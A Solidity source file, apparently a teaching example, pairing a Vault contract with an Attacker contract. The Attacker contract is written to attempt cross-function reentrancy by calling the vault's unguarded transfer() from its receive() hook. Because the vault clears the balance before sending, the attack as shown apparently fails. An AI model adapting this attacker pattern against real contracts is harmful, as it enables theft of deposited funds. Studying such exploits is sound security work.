// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {ReentrancyGuard} from "./ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    mapping(address owner => uint256 amount) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function transfer(address _to, uint256 _amount) external {
        if (balances[msg.sender] >= _amount) {
            balances[_to] += _amount;
            balances[msg.sender] -= _amount;
        }
    }

    function withdrawAll() external noReentrancy {
        uint256 balance = balances[msg.sender];

        require(balance > 0, "you don't have any funds deposited!");

        balances[msg.sender] -= balance;

        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "cannot transfer funds!");
    }
}

contract Attacker {
    Vault public immutable vaultToAttack;
    Attacker public attackerSecondary;
    uint256 public constant DEPOSIT_AMOUNT = 1 ether;

    constructor(Vault _vault) {
        vaultToAttack = _vault;
    }

    function setSecondaryAttacker(Attacker _attackerSecondary) external {
        attackerSecondary = _attackerSecondary;
    }

    function attackStep1() external payable {
        vaultToAttack.deposit{value: DEPOSIT_AMOUNT}();

        vaultToAttack.withdrawAll();
    }

    function attackStep2() external {
        vaultToAttack.withdrawAll();
    }

    receive() external payable {
        if (address(vaultToAttack).balance >= DEPOSIT_AMOUNT) {
            vaultToAttack.transfer(address(attackerSecondary), vaultToAttack.balances(address(this)));
        }
    }
}
